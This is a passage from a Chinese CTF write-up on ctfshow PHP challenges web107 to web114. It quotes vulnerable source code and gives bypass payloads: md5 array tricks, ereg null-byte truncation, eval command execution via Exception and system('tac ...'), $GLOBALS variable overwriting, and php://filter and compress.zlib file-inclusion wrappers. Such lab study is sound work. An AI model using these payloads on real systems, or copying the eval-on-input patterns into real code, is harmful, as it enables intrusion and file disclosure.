punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>parse_str — 将字符串解析成多个变量</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"first=value&amp;arr[]=foo+bar&amp;arr[]=baz"</span><span class="token punctuation">;</span><span class="token comment">// 推荐用法</span><span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'first'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">// value</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// foo bar</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'arr'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// baz</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里又出现了md5，想到的还是数组绕过，只要让post传入的flag为null即可，所以</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?v3[]&#x3D;1post:v1&#x3D;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/image-20210526223058700.png"></p><p>最开始是想的给v3随便传一个数比如1，v1传入其md5的值即v3=flag=a0b923820dcc509a也可以得到flag</p><h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 23:53:55*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配(这个函数在php7已经被废弃了)</p><p><strong>strrev()</strong> 函数反转字符串。</p><p><strong>intval()</strong> 函数用于获取变量的整数值</p><p>所以payload:</p><pre class="line-numbers language-none"><code class="language-none">url&#x2F;?c&#x3D;aaa%00778<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-29 22:02:34*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本题用到了php的异常处理（Exception），通过eval中的$v1($v2())来执行命令</p><p>这里v1和v2都要有字母即可进入eval，执行我们想要的命令,用php内置类让v1不进行报错，v2执行我们的命令</p><pre class="line-numbers language-none"><code class="language-none">Exception 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类ReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/image-20210527194742184.png"></p><p><img src="/images/image-20210527194836031.png"></p><p>最后payload:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;tac fl36dg.txt&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exception也可以用ReflectionClass 或者 ReflectionMethod替代</p><p><strong>用cat，more，less没有输出，但用tac或者tail就有，也不知道为什么，可能有过滤？</strong></p><h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-29 22:49:10*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上一道类似，但是过滤了所有数字和特殊字符</p><p>php内置类 利用 FilesystemIterator 获取指定目录下的所有文件。这是一个文件系统迭代器</p><p><a href="https://www.php.net/manual/zh/class.filesystemiterator.php">FilesystemIterator</a></p><p>通过新建FilesystemIterator，使用getcwd()来显示当前目录下的文件结构</p><p>getcwd():获取当前工作目录</p><p>FilesystemIterator(getcwd())</p><p>这样就可以看到当前目录下有什么文件</p><p><img src="/images/image-20210527201042842.png"></p><p>再直接访问即可</p><h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 02:41:40*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先学习一下php的取地址符&amp;</p><p>php的引用就是在变量或者函数、对象等前面加上&amp;符号。在PHP 中引用的意思是：不同的名字访问同一个变量内容。与C语言中的指针是有差别的，C语言中的指针里面存储的是变量的内容在内存中存放的地址。</p><pre class="line-numbers language-none"><code class="language-none">&lt;? $a&#x3D;&quot;ABC&quot;; $b &#x3D;&amp;$a; echo $a;&#x2F;&#x2F;这里输出:ABC echo $b;&#x2F;&#x2F;这里输出:ABC $b&#x3D;&quot;EFG&quot;; echo $a;&#x2F;&#x2F;这里$a的值变为EFG 所以输出EFG echo $b;&#x2F;&#x2F;这里输出EFG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这道题中，最终的目标是通过var_dump()输出变量的参数，<code> var_dump($$v1);</code>而$v1必须是ctfshow,这里还是用到了变量覆盖，通过<code>eval(&quot;$$v1 = &amp;$$v2;&quot;);</code>实现</p><pre class="line-numbers language-none"><code class="language-none">$GLOBALS — 引用全局作用域中可用的全部变量，一个包含了全部变量的全局组合数组。变量的名字就是数组的键。$$v1&#x3D;&amp;$$v2$ctfshow&#x3D;&amp;$GLOBLAS这样就可以输出所有的变量，也就有flag了payload:&#x2F;?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210527203916163.png"></p><h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 23:47:49*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到过滤的想到文件包含，没有过滤filter，那就用这个，过滤了base64，那就不要base64就行了</p><p><img src="/images/image-20210114181853207.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x2F;resource&#x3D;flag.php测试了一下read后有没有参数不重要，也可以直接不要了，算是复习了一下文件包含php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.phpphp:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.phpcompress.zlib:&#x2F;&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20210527204609650.png"></p><h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-30 23:47:52*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了filter,那用compress.zlib即可</p><pre class="line-numbers language-none"><code class="language-none">payload:url&#x2F;?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-01 15:02:53*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不是很懂在干什么，把compress过滤了但filter又放出来了，那就直接</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就行了</p><h3 id="web105-1"><a href="#web105-1" class="headerlink" title="web105"></a>web105</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter 